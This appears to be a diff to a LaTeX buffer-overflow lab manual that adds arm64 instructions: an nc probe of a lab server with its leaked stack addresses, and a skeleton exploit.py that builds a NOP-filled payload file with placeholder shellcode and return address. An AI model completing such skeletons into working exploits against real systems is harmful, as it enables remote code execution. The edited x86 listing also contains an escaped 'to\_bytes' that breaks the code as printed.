@@ -25,7 +25,17 @@ actual messages you see may be different).
 
 \ifdefined\arm
 \begin{lstlisting}
- ***
+// On the VM (i.e., the attacker machine)
+$ echo hello | nc 10.9.0.5 9090
+Press Ctrl+C
+
+// Messages printed out by the container
+server-1-10.9.0.5  | Got a connection from 10.9.0.1
+server-1-10.9.0.5  | Starting stack
+server-1-10.9.0.5  | Input size: 6
+server-1-10.9.0.5  | Frame pointer (x29) inside foo():  0x0000fffffffff110
+server-1-10.9.0.5  | Frame pointer (x29) inside bof():  0x0000fffffffff080
+server-1-10.9.0.5  | Buffer's address inside bof():     0x0000fffffffff0a0
 \end{lstlisting}
 
 \else
@@ -96,6 +106,44 @@ values in the code.
 \newcommand{\needtochange}{\ding{73} Need to change \ding{73}}
 
 
+\ifdefined\arm
+% For arm64 
+\begin{lstlisting}[language=python, caption={The skeleton exploit code (\texttt{exploit.py})}]
+#!/usr/bin/python3
+import sys
+
+# You can copy and paste the shellcode from Task 1
+shellcode = (
+  ""                     # (*@\needtochange@*)
+).encode('latin-1')
+
+# Fill the content with NOP's (0xD503201F is NOP instruction in arm64)
+nop = (0xD503201F).to_bytes(4, byteorder='little')
+content = bytearray(517)
+for offset in range(int(500/4)):
+   content[offset*4:offset*4 + 4] = nop
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 0                # (*@\needtochange@*)
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value
+# and put it somewhere in the payload
+ret    = 0x00            # (*@\needtochange@*)
+offset = 0               # (*@\needtochange@*)
+
+# Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+\end{lstlisting}
+
+\else
+% For x86 
 \begin{lstlisting}[language=python, caption={The skeleton exploit code (\texttt{exploit.py})}]
 #!/usr/bin/python3
 import sys
@@ -115,18 +163,18 @@ content[start:start + len(shellcode)] = shellcode
 
 # Decide the return address value 
 # and save it somewhere in the payload
-ret    = 0xAABBCCDD      # (*@\needtochange@*)
+ret    = 0x00            # (*@\needtochange@*)
 offset = 0               # (*@\needtochange@*)
 
-# Use 4 for 32-bit address 
-# Use 8 for 64-bit address
-content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
+# Use 4 for 32-bit address, 8 for 64-bit address
+content[offset:offset + 4] = (ret).to\_bytes(4,byteorder='little')
 ##################################################################
 
 # Write the content to a file
 with open('badfile', 'wb') as f:
   f.write(content)
 \end{lstlisting}
+\fi
 
 
 After you finish the above program, run it. This will generate
